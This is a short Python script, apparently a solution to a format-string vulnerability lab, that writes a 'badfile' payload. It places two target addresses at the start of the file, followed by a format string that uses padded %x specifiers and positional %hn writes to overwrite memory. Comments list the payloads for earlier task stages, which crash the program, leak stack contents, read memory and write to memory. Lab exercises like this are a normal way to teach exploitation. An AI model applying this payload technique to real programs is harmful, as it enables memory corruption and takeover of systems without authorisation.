#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e506a
content[0:4]  =  (number).to_bytes(4,byteorder='little')

number2  = 0x080e5068
content[4:8]  =  (number2).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
#content[8:12]  =  ("@@@@").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
# task 1: s = '%s' * 100
# task 2a: s = '%.08x' * 60
# task 2b: s = '%.08x' * 59 + '%s'
# task 3a: s = '%.08x' * 59 + '%n'
# task 3b: s = '%60$n' + "#"*72 + '61$hhn' + "#"*176 + '%60$hhn'
# task 3c; s = '%.43699x' + '%60$hn' + '%.8738x' + '%61$hn'
s = '%.43699x' + '%60$hn' + '%.8738x' + '%61$hn'
# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
